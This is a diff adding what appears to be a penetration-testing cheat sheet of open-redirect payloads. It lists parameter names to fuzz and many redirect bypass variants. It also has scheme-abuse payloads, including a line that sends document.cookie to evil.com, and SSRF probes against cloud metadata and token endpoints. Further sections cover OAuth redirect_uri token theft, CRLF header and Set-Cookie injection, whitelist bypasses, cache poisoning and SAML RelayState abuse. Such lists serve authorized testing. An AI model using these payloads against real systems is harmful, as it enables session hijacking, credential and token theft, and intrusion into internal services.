@@ -1,0 +1,149 @@
+# OPEN REDIRECT PAYLOADS - 2026 edition
+# Test with 'evil.com' replaced by YOUR domain (or YOUR-COLLABORATOR for auto).
+# Methodology: if a filter exists, chain 1->2->3 until one slips; always check BOTH header and meta/JS redirect.
+
+## 1) PARAMETER NAMES (ffuf FUZZ)
+url, uri, u, link, links, redirect, redir, redir_url, redir_uri, redirect_url,
+redirect_uri, redirecturl, redirect_url, next, next_url, return, return_url,
+return_to, returnUrl, callback, cb, continue, destination, dest, target, goto,
+go, out, view, path, dir, fwd, forward, referer, ref, back, from, source,
+success, success_url, failure_url, cancel_url, error_url, login_url, logout_url,
+reset_url, register_url, verify_url, confirm_url, complete_url, origin, relay,
+da, autoriza, authorize, oauth_callback, state, response_type, redirect_type
+
+## 2) BASIC (no filter)
+https://evil.com
+http://evil.com
+//evil.com
+///evil.com
+////evil.com
+/\evil.com
+/\/evil.com
+https://evil.com/
+https://evil.com:443
+https://evil.com/@trusted.com
+
+## 3) PROTOCOL-RELATIVE & SLASH VARIANTS
+//evil.com
+//evil.com/%2f..
+//evil.com%2f..
+//evil.com//
+///evil.com
+https:/evil.com
+https:///evil.com
+https:\evil.com
+https:evil.com
+http:/\\evil.com
+https://trusted.com/%2e%2e/evil.com
+/\\evil.com
+
+## 4) BACKSLASH & DOMAIN-SPLIT (browser normalizes \ to /)
+https://evil.com\@trusted.com
+//evil.com\@trusted.com
+https://trusted.com\@evil.com
+https://trusted.com/evil.com\..\..
+https://trusted.com%5cevil.com
+//trusted.com\@evil.com/%2e%2e
+
+## 5) @ / CREDENTIALS CONFUSION
+https://evil.com@trusted.com          # login='evil.com' -> host=trusted.com (LEGIT browser)
+https://trusted.com@evil.com          # INJECTS to evil.com
+https://evil.com#@trusted.com
+https://evil.com%2F@trusted.com
+https://trusted.com%40evil.com
+https://trusted.com@evil.com/%2e%2e
+//evil.com@trusted.com
+
+## 6) ENCODING LAYERS (each layer; sometimes double decode on node/PHP)
+https%3A%2F%2Fevil.com
+https%253A%252F%252Fevil.com
+%2F%2Fevil.com
+https://evil.com%2F..%2Ftrusted.com
+https://evil.com%00
+https://evil.com%0a
+https://evil.com%23
+https://evil.com%09
+https:%2f%2fevil.com
+htt%70s://evil.com
+ht%74ps://evil.com
+https://evi%6c.com
+
+## 7) SCHEME ABUSE (javascript: / data: / vbscript: / view-source:)
+javascript:alert(1)
+javascript:alert(document.cookie)
+javascript:fetch('//evil.com/?c='+document.cookie)
+javascript://trusted.com/%0aalert(1)
+data:text/html,<script>alert(1)</script>
+data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==
+vbscript:msgbox(1)
+view-source:https://evil.com
+about:blank
+jar:https://evil.com/x.jar!/ 
+# If Location is stuck as 'javascript:...' the browser may STILL execute it when the 
+# app does window.location = data. Test in a real browser, not just via curl.
+
+## 8) OPEN-REDIRECT -> SSRF / TOKEN-MAN IN THE MIDDLE
+# Combination: if the server follows the redirect while requesting it (curl -L / fetch),
+# open redirect becomes SSRF. Probe with:
+?url=http://169.254.169.254/latest/meta-data/
+?url=http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+?url=http://127.0.0.1:6379/    (gopher-convertible? ssrfmap)
+# OAuth token leak:
+?redirect_uri=https://evil.com&response_type=code&state=x
+?redirect_uri=https://evil.com/oauth-callback
+# (set evil.com as the registered callback OR use a path+%0d%0a to smuggle)
+
+## 9) CRLF / HEADER INJECTION (older stacks still bite)
+?url=%0d%0aLocation:%20https://evil.com
+?url=%0d%0aSet-Cookie:%20session=hijacked
+?url=%0d%0aX-XSS-Protection:0
+?url=%0a%0dLocation:%20https://evil.com
+?url=/%0d%0aLocation:%20https://evil.com
+# check response headers for injected Set-Cookie/Location
+
+## 10) META-REFRESH / JS-WINDOW SINK (when server does <meta http-equiv=refresh>)
+<meta http-equiv="refresh" content="0;url=javascript:alert(1)">   # raw echo
+0;url=https://evil.com
+url=//evil.com
+# window.location sink payloads (same classes apply)
+
+## 11) TRUSTED-DOMAIN BYPASS BUILDER (when whitelist exists)
+# whitelist = startsWith('trusted.com')   ->  use:
+evil.com
+trusted.com.evil.com
+trusted.com.evil.com/path
+evil.com.trusted.com
+trusted.com%2eevil.com
+trusted.com@evil.com
+trusted.com.evil.com@evil.com
+# whitelist = contains('trusted.com')   ->  use:
+evil.trusted.com.attacker.net
+https://trusted.com.evil.com
+# whitelist = endsWith('trusted.com')   ->  use:
+x@evil.com?x=trusted.com
+https://evil.com/?x=.trusted.com
+https://evil.com#.trusted.com
+//evil.com#trusted.com
+https://trusted.com.evil.com
+# URI path confusion:  https://trusted.com/evil.com   (no host change, but some parsers miss .)
+# @-trick inside whitelisted:  https://trusted.com@evil.com  (BROWSER goes evil.com)
+
+## 12) CACHE POISONING ANGLE (worth a look on high-traffic pages)
+# If the app reflects 'url' param anywhere (redirect, js var, og:url, canonical) the page is
+# cacheable -> poison with a redirect to YOUR server:
+GET /?url=//evil.com  (response 302 Location://evil.com + cache headers) -> poison for next visitor
+# Test: vary again, check if response served from cache for anonymous second request.
+
+## 13) RELAY / STATE ABUSE (SAML/OIDC)
+?RelayState=https://evil.com
+?state=https://evil.com
+?target=https://evil.com
+?SAMLRequest=...&RelayState=//evil.com
+# test in the flow that SENDS the user post-auth back to RelayState value.
+
+## 14) CLICKABLE-PROOF AUTO-TEST FLOW (for your checklist)
+# 1-recon: discover params with waybackurls/gau + ffuf (Section 1 list)
+# 2-test-all: Burp Intruder 1 parameter x all payload classes (Sections 2-7)
+# 3-confirm: for each 302 check 'Location' header; for meta/js sink open in browser
+# 4-verify: attacker.net redirect chain via Collaborator, record response for report
+# 5-enrich: OAuth/testing pairs from Section 8, CRLF Section 9, cache Section 12
